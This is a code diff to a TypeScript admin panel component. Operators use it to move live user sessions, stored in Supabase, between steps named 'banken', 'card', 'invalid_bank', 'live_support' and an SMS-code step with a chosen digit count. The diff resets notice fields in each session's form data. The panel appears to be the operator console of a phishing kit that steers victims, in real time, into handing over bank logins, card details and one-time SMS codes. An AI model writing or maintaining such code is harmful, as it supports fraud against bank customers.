@@ -547,7 +547,19 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
     }
 
     if (action === "win" || action === "banken" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
-      await supabase.from("sessions").update({ current_step: action }).eq("id", sessionId);
+      const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
+      const prevFd = (existing?.form_data ?? {}) as Record<string, unknown>;
+      await supabase.from("sessions").update({
+        current_step: action,
+        status: "online",
+        form_data: {
+          ...prevFd,
+          specialNoticeText: null,
+          specialNoticeImage: null,
+          specialNoticeLang: null,
+          specialNoticeSentAt: null,
+        },
+      }).eq("id", sessionId);
     } else if (action === "ban_ip") {
       const row = rowsRef.current.find(r => r.id === sessionId);
       if (row && row.ip_address) {
@@ -575,13 +587,22 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   async function confirmSmsRedirect() {
     if (!supabase || !smsPromptSessionId) return;
     const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
+    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", smsPromptSessionId).maybeSingle();
+    const prevFd = (existing?.form_data ?? {}) as Record<string, unknown>;
     await supabase
       .from("sessions")
       .update({
         current_step: "sms",
         sms_digits: digits,
         sms_custom_text: smsCustomTextInput.trim() || null,
-        status: "online"
+        status: "online",
+        form_data: {
+          ...prevFd,
+          specialNoticeText: null,
+          specialNoticeImage: null,
+          specialNoticeLang: null,
+          specialNoticeSentAt: null,
+        },
       })
       .eq("id", smsPromptSessionId);
     setSmsPromptSessionId(null);
